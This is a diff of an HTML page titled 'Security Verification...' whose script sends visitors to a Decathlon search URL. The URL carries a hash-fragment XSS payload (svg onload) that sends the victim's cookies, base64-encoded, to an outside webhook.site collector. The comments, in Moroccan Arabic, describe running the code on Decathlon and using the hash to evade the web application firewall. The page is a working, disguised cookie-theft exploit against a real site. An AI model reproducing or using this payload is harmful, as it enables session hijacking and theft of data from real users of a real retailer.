@@ -1,16 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Security Verification...</title>
 </head>
 <body>
     <script>
-        // الكود اللي غيسحب الداتا بلا alert باش الـ Support ما يعيق بوالو
-        let exfiltrate = "fetch('https://dvcvt1kmjcj31iisr8xraaf39ufl3mrb.oastify.com/?data='+btoa(document.cookie))";
+        // الكود اللي غيتنفذ وسط Decathlon باش يسحب الداتا
+        // استعملنا b64Data باش نضمنوا أن الرموز في الكوكيز ما يهرسوش الرابط
+        let exfiltrate = "fetch('https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data='+btoa(document.cookie), {mode:'no-cors'})";
         
-        // استعملنا الـ Hash (#) حيت هو اللي لقينا فيه الثقب
+        // استغلال ثغرة الـ Hash (#) اللي لقينا باش نهربو من الـ WAF
         let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
         
+        // تنفيذ التحويل التلقائي
         window.location.href = finalTarget;
     </script>
 </body>
